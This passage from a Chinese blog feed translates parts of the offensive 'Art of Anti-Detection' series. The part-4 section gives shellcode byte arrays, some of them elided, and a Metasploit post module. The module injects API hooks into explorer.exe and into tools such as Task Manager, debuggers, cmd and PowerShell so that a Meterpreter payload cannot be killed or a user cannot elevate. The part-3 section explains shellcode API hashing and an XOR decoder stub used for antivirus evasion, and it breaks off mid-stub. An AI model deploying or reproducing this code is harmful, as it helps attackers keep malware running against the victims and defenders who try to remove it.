class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">prevent_elevate_32 = <span class="string">""</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xfc\xe8\xb6\x00\x00\x00\x5b\xe8\x2f\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x89\xc6\x68\x10\xe1\x8a\xc3\xe8\x23\x00\x00\x00"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xc3\x5f\x5f\x5a\x8b\x12\xeb\x8e\x5d\x68\x2d\xf9"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x7f\xe5\xff\xd5\x68\x75\x1f\x0a\x33\xff\xd5\xe8"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x82\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; block_api_32</span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">prevent_elevate_64 = <span class="string">""</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xf9\x7f\xe5\xff\xd5\x41\xba\x75\x1f\x0a\x33\xff"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xd5\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; block_api_64</span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x59\x41\x89\xda\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_64 = <span class="string">""</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xfc\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; block_api_64</span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x5d\x41\xba\x49\x47\xc6\x62\xff\xd5\x49"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x89\xc0\xba\x00\x00\x00\x00\xb9\xff\x00\x1f\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x41\xba\xee\x95\xb6\x50\xff\xd5\x48\x89\xc3\x6a"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x78\x69\x74\x55\x50\x48\x89\xe2\x41\xba\x49\xf7"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x02\x78\xff\xd5\x48\x89\xc5\xe8\x00\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x58\xb9\xb7\x01\x00\x00\xc6\x00\x00\x48\xff\xc8"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xe2\xf8\x6a\x00\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_32= <span class="string">""</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xfc\xe8\x82\x00\x00\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; block_api_32</span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5d\x68\x49\x47\xc6\x62\xff\xd5"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\x6a\x00\x68\xff\x0f\x1f\x00\x68\xee\x95\xb6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\xff\xd5\x89\xc3\x6a\x00\x68\x70\x69\x33\x32"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5b\x0c\x8b\x43\x0c\xc7\x40\x20\xff\xff\xff\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xb9\x44\x01\x00\x00\xe8\x00\x00\x00\x00\x58\xc6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x00\x00\x48\xe2\xfa\x6a\x00\xff\xd5"</span></span><br></pre></td></tr></table></figure><br><br>现在，在声明了shellcode之后，我们需要遍历所有进程并将shellcode注入可能导致我们麻烦的进程中。以下代码实现循环遍历所有进程，注入并钩住AdjustTokenPrivileges和RtlSetDaclSecurityDescriptor API的shellcode。我们使用client.sys.process.processes方法访问目标计算机上的进程信息。如果进程名称是explorer.exe或我们在顶部声明的任何分析工具，它将通过调用execute_shellcode函数来注入我们的shellcode。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">analysis_tools =['taskmgr.exe','procexp64.exe','ida.exe','ida64.exe','windbg.exe','x32dbg.exe','ollydbg.exe','tasklist.exe','cmd.exe','powershell.exe','cheatengine-x86_x64.exe']</span><br><span class="line"></span><br><span class="line">os = client.sys.config.sysinfo['OS']</span><br><span class="line">print_status("Target OS -&gt; #&#123;os&#125;")</span><br><span class="line"></span><br><span class="line">client.sys.process.processes.each do |p|</span><br><span class="line">  begin      </span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if 'explorer.exe' === p['name'].to_s.downcase or analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">      print_status("Hooking RtlSetDaclSecurityDescriptor on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      print_status("Hooking AdjustTokenPrivileges on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(prevent_elevate_64,nil,p['pid'].to_i)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(prevent_elevate_32,nil,p['pid'].to_i)</span><br><span class="line">      end</span><br><span class="line">      print_good("UAC elevation disabled for #&#123;p['name']&#125;")</span><br><span class="line">    end</span><br><span class="line">  rescue =&gt; e</span><br><span class="line">    print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>现在，我们需要考虑运行的操作系统版本是否高于Windows 7的情况。我们可以通过访问client.sys.config.sysinfo [‘OS’]结构来简单地进行检查。我们将检查版本字符串，并决定是使用保护进程方法还是使用挂钩API的方法。如果我们需要挂钩NtOpenProcess和TerminateProcess API，我们可以简单地在API挂钩shellcode中更改函数名称哈希。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">if os.to_s.include? "Windows 7" or os.to_s.include? "Windows XP" or os.to_s.include? "2008"</span><br><span class="line">  client.sys.process.processes.each do |p|</span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if pid.to_i === p['pid'].to_i</span><br><span class="line">      print_status('Injecting self defense shellcode...')</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(self_defense_64,nil,pid)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(self_defense_32,nil,pid)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  print_good('Self defense active !')</span><br><span class="line">else</span><br><span class="line">  # Set NtOpenProcess &amp; TerminateProcess hashes</span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line"></span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line"></span><br><span class="line">  hooked = ""</span><br><span class="line">  while 1</span><br><span class="line">    client.sys.process.processes.each do |p|</span><br><span class="line">      # Check Payload Arch</span><br><span class="line">      if analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">        print_status("Hooking TerminateProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        print_status("Hooking NtOpenProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        begin</span><br><span class="line">          if 'x64' === p['arch'].to_s</span><br><span class="line">            execute_shellcode(prevent_terminate_64,nil,p['pid'].to_i)</span><br><span class="line">          else</span><br><span class="line">            execute_shellcode(prevent_terminate_32,nil,p['pid'].to_i)</span><br><span class="line">          end</span><br><span class="line">          hooked &lt;&lt; p['pid'].to_s+','</span><br><span class="line">          print_good("Process termination disabled for #&#123;p['name']&#125;")</span><br><span class="line">        rescue =&gt; e</span><br><span class="line">          print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">    if not datastore['LOOP']</span><br><span class="line">      break</span><br><span class="line">    end           </span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在替换函数哈希时，请记住字节序问题，哈希值将以相反的顺序存储。当您查看上面的源代码时，您会发现在while条件内调用execute_shellcode函数，该条件取决于我们post模块的LOOP参数。这种机制是必要的，因为当用户在执行我们的模块后创建新的任务管理器进程时，该进程仍将能够终止其他进程。因此，我们需要一种将对抗终止进程shellcode持续注入到新创建的过程中的机制。仅对于反进程终止shellcode才需要使用此代码，因为其他代码已注入到资源管理器和我们自己的进程中，因此用户不太可能重新启动资源管理器。最后，这是我们的post模块的最后一部分。这是最终的self_defense.rb模块。只需将其移至~/.msf4/modules/post/windows目录下，即可将其添加到Metasploit。下面我们来看操作步骤。<br>首先，我们执行Meterpreter载荷。<br><div align="center"><br><img src="/img/anti_av4_exec_meterpreter.gif" align><br></div>

<p>启动会话后，我们通过键入以下内容执行模块run post/windows/self_defense.</p>
<p><div align="center"><br><img src="/img/anti_av4_self_defense.gif" align><br></div><br>现在，我们的载荷受到了保护，用户无法以管理员身份终止程序。<br>可以通过各种方式来改进此模块，尤其是可以使用简单的机制来检查handle参数并仅在将进程句柄传递给函数时才禁用它，而不是直接禁用OpenProcess API。同样，除了将我们的shellcode硬编码到模块源中之外，还有一种更动态的方式来生成它们。特别是集成Metasploit的有效载荷编码功能，可以使我们在每次执行时生成唯一的shellcode。我将在存储库中添加新的自保护shellcode。</p>
<h2 id="参考">参考</h2><ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput</a></li>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly</a></li>
<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly</a></li>
</ul>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-4-self-defense/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-4-self-defense/</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在反检测的艺术系列中，我们主要研究了如何绕过自动化安全产品的方法，但是在这一部分中，我们将重点介绍几种自保护方法，保护我们在目标终端上的载荷免受其实际用户的破坏。用户可能是缺乏网络技术的员工或也有可能是网络安全部门的蓝队成员。我们的目的是在没有任何特权的情况下存活并在目标终端中隐藏我们的存在。但是，在继续学习之前，我建议您阅读本系列的前几篇文章，因为这些自保护方法包含大量的有关shellcoding和API hooking的前置知识，现在我们开始吧！<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术3-shellcode的魔力 （翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/"/>
    <id>http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/</id>
    <published>2020-09-10T11:39:22.000Z</published>
    <updated>2021-03-17T14:37:55.966Z</updated>
    <content type="html"><![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br><a id="more"></a></p>
<h2 id="0x00_相关术语">0x00 相关术语</h2><h3 id="进程环境块（PEB）">进程环境块（PEB）</h3><p>在计算机中进程环境块（缩写为PEB）是Windows NT操作系统中的一种数据结构。它是操作系统内部使用的不透明数据结构，其中大多数字段除操作系统外均不供其他人使用。微软在其MSDN库文档（仅记录了一些字段）中指出，该结构可能会在Windows的未来版本中更改。PEB包含涉及整个进程很多阐述，包括全局上下文，启动参数，程序映像加载器的数据结构，程序映像基址以及用于为进程范围的数据结构提供互斥的同步对象。</p>
<h3 id="导入表（IAT）">导入表（IAT）</h3><p>导入表是一种用于查找地址的表，用于程序调用其他模块中的函数时查找地址。它可以采用按序号导入和按名称导入两种形式。由于已编译的程序无法知道其依赖的库的存储位置，因此，每当进行API调用时，都需要进行间接跳转。当动态链接器加载模块并将它们连接在一起时，它会将实际地址写入IAT插槽，以便它们指向相应库函数的所在的内存位置。</p>
<h3 id="数据执行保护（DEP）">数据执行保护（DEP）</h3><p>数据执行保护（DEP）是一组硬件和软件技术，可对内存执行安全检查，以帮助防止恶意代码在系统上运行。在Microsoft Windows XP Service Pack 2（SP2）和Microsoft Windows XP Tablet PC Edition 2005中，DEP由硬件和软件强制执行。DEP的主要好处是可以帮助防止从数据页执行代码。通常，不会从默认堆和栈中执行代码。硬件强制的DEP检测从这些位置运行的代码，并在执行时引发异常。软件强制的DEP可以帮助防止恶意代码利用Windows中的异常处理机制。</p>
<h3 id="地址布局随机化（ASLR）">地址布局随机化（ASLR）</h3><p>地址空间布局随机化（ASLR）是一种有关防止缓冲区溢出攻击的计算机安全技术。为了防止攻击者可靠地跳转到内存中的某个特定漏洞位置利用功能，ASLR随机排列进程的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈、堆和依赖库地址。</p>
<h3 id="stdcall调用约定">stdcall调用约定</h3><p>stdcall调用约定是Pascal调用约定的一种变体，在该约定中，被调用方负责清理栈，但参数按照_cdecl调用约定的顺序从右到左入栈。寄存器EAX，ECX和EDX被指定在函数内使用。返回值存储在EAX寄存器中。 stdcall是Microsoft Win32 API和Open Watcom C ++的标准调用约定。</p>
<h2 id="0x01_相关介绍">0x01 相关介绍</h2><p>Shellcode在网络安全领域中扮演着非常重要的角色，它被广泛用于许多恶意软件和漏洞利用中。那么，什么是shellcode？ Shellcode是一串数据，将被解释为CPU上的指令，编写Shellcode的主要目的是利用漏洞，该漏洞允许在系统上执行任意代码（例如溢出漏洞），因为Shellcode可以直接在内存内运行，大量恶意代码都利用它。名称shellcode的原因是一般shellcode在执行时会返回命令shell。但随着时间的推移，含义已经演变，如今几乎所有编译器生成的程序都可以转换为shellcode，因为编写shellcode涉及深入了解目标体系结构和操作系统的汇编语言后，本文将假定读者知道如何在Windows和Linux环境下以汇编形式编写程序。互联网上有很多开源的shellcode，但是为了利用新的漏洞和不同的漏洞，每个网络安全研究人员都应该能够编写自己的复杂shellcode，并且编写自己的shellcode有助于理解操作的关键概念。本文的目的是解释基本的shellcode概念，展示降低shellcode的检测率并绕过某些漏洞缓解措施的方法。</p>
<h2 id="0x02_shellcode编写基础">0x02 shellcode编写基础</h2><p>为不同的操作系统编写shellcode要使用不同的方法，与Windows不同，基于UNIX的操作系统提供了一种通过int 0x80接口与内核进行通信的直接方法，基于UNIX的操作系统内部的所有syscall都有一个唯一的编号，即调用0x80中断代码（int 0x80），内核使用给定的编号和参数执行syscall，但这是问题所在，Windows没有直接的内核接口，这意味着必须有指向函数的具体指针（内存地址）才能调用它们，不幸的是，对功能地址进行硬编码并不能完全解决问题，Windows内部的每个功能地址在每个Service Pack，版本甚至配置中都会发生变化，使用硬编码地址使Shellcode高度依赖版本，在Windows上编写与版本无关的Shellcode可以解决寻址问题可能会贯穿整个解决地址问题，这可以通过在运行时动态查找函数地址来实现。</p>
<h2 id="0x03_解决地址问题">0x03 解决地址问题</h2><p>在整个过程中，shellcode编写者一直在寻找在运行时查找Windows API函数地址的巧妙方法，在本文中，我们将重点介绍一种称为PEB解析的方法，该方法使用Process Environment Block（PEB）数据结构来查找基地址。在分析已加载的DLL并通过分析导出表（EAT）来找到其函数地址时，metasploit框架内的几乎所有版本无关的Windows shellcode都使用此技术来查找Windows API函数的地址，这种方法利用了在Windows中，可以通过FS段寄存器找到线程环境块（TEB）地址，当执行Shellcode时，TEB块包含很多有用的数据，包括我们正在寻找的PEB结构在内存中，我们需要从TEB块的向后48个字节，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov edx, [fs:eax+<span class="number">48</span>]</span><br></pre></td></tr></table></figure></p>
<p>现在我们有一个指向PEB结构的指针，</p>
<div align="center"><br><img src="/img/anti_av3_TEB.png" align><br></div>

<p>获取PEB结构指针之后，现在我们将从PEB块的开头开始向后移动12个字节，以获取PEB块内部的Ldr数据结构指针的地址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">12</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_PEB.png" align><br></div>

<p>Ldr结构包含有关该进程已加载模块的信息，如果我们在Ldr结构内再移20个字节，我们将到达InMemoryOrderModuleList中的第一个模块，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">20</span>]</span><br></pre></td></tr></table></figure></p>
<div align="center"><br><img src="/img/anti_av3_Ldr.png" align><br></div>

<p>现在，我们的指针指向InMemoryOrderModuleList，这是一个LIST_ENTRY结构，Windows将该结构定义为包含该进程已加载模块的双向链接列表的头部。列表中的每个项目都是一个指向LDR_DATA_TABLE_ENTRY结构的指针，该结构是我们的主要目标，它包含已加载DLL（模块）的全名和基址，由于已加载模块的顺序可以更改，因此我们应检查全名为了找到包含我们要查找函数的正确的DLL，可以轻松地做到这一点，只要DLL名称与我们要查找的名称相匹配，则从LDR_DATA_TABLE_ENTRY的开头向后移40个字节，我们可以继续进行，通过在LDR_DATA_TABLE_ENTRY内部向前移动16个字节，我们现在终于有了加载的DLL的基址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">16</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_LDR_DATA_TABLE_ENTRY.png" align><br></div><br>获取函数地址的第一步已经完成，现在我们有了包含所需函数的DLL的基址，我们必须解析DLL的导出表才能找到所需的函数地址，导出表位于在PE可选头中，从基地址向后移动60个字节，我们现在有了一个指向DLL在内存中的PE可选头的指针，<br><div align="center"><br><img src="/img/anti_av3_PE_On_Memory.gif" align><br></div>

<p>最后我们需要使用（模块基地址+ PE头地址+ 120字节）公式计算导出表的地址，这将给出导出表的地址（EAT），获得EAT地址后，我们现在可以访问对于DLL导出的所有功能，Microsoft下图描述了IMAGE_EXPORT_DIRECTORY，</p>
<div align="center"><br><img src="/img/anti_av3_Image_Export_Directory.gif" align><br></div><br>该结构包含导出函数的地址，名称和数量，使用同大小计算方式可以遍历函数地址，可以在此结构内获得所需的函数地址，当然，由于每个Windows版本，导出函数的顺序可能会有所不同在获取函数地址之前，应先检查函数名称，在确定函数名称之后，现在就可以找到函数地址，因此您可以理解，此方法仅涉及计算多个Windows数据结构的大小，并且遍历内存内部，这里真正的挑战是建立一个可靠的名称比较机制来选择正确的DLL和功能，似乎PEB解析技术很难实现，请不要担心，有更简单的方法可以做到这一点。<br><br>## 0x04 API哈希<br><br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">metasploit</a>项目中的几乎所有shellcode都使用一个称为<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">Hash API</a>的汇编块，这是Stephen Fewer编写的一小段代码，自2009年以来，在metasploit中大多数Windows版本shellcode都使用了这个汇编文块，该汇编块使解析PEB结构变得更加容易，它使用基本的PEB解析逻辑和一些其他哈希方法来通过计算函数和模块名称的ROR13哈希来快速查找所需的函数。此块的用法非常简单，它使用stdcall调用约定，唯一的区别在于传送的函数参数，它需要函数名和包含该函数的DLL名称的ROR13哈希，传送必需的参数和函数哈希之后，它如前所述解析了PEB块，并在找到模块名后找到了模块名它计算ROR13哈希并将其保存到栈中，然后移至DLL的导出地址表，并计算每个函数名的ROR13哈希，它获取每个函数名称哈希值和模块名称哈希值的总和，如果总和与我们正在寻找的哈希值匹配，则意味着找到了所需的函数，最后，Hash API使用以下命令跳转到找到的函数地址在堆栈上传递的参数，这是一段非常优雅的代码，但由于它的流行和广泛使用，它已经到了最后的日子，某些反病毒产品和漏洞缓解措施专门针对此代码块的工作逻辑，甚至某些视反病毒产品对使用Hash API所使用的ROR13哈希作为识别恶意文件的签名，由于操作系统内部反漏洞解决方案的最新进展，Hash API的寿命很短，但是还有其他找到Windows的方法API函数地址，同时使用编码方法，此方法仍可以绕过大多数反病毒产品。<br><br>## 0x05 编码器/解码器设计<br><br>在开始涉及之前，读者需要知道的是单独使用编码器并不能生成完全不可检测的shellcode，在执行shellcode后解码器将直接解码整个shellcode为其原始形式，这不能绕过反病毒产品的动态分析机制。<br>解码器逻辑很简单，它将使用一个随机生成的多字节XOR密钥对shellcode进行解码，在执行解码操作后它将执行它，在将shellcode放入解码器头之前，应使用多字节XOR密钥对shellcode进行加密，并且应将shellcode和XOR密钥分别放置在<shellcode>、<key>标签内，<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#===============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode    |&#10;;&#9;|EDI -&#62; Pointer to key          |&#10;;&#9;|ECX -&#62; Shellcode index counter |&#10;;&#9;|EDX -&#62; Key index counter       |&#10;;&#9;|AL  -&#62; Shellcode byte holder   |&#10;;&#9;|BL  -&#62; Key byte holder         |&#10;;&#9;#===============================#&#10;;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10; JMP GetShellcode         ; Jump to shellcode label&#10;Stub: &#10; POP ESI                  ; Pop out the address of shellcode to ESI register &#10; PUSH ESI                 ; Save the shellcode address to stack &#10; XOR ECX,ECX              ; Zero out the ECX register&#10;GetKey: &#10; CALL SetKey              ; Call the SetKey label&#10; Key: DB &#60;Key&#62;            ; Decipher key&#10; KeyEnd: EQU $-Key        ; Set the size of the decipher key to KeyEnd 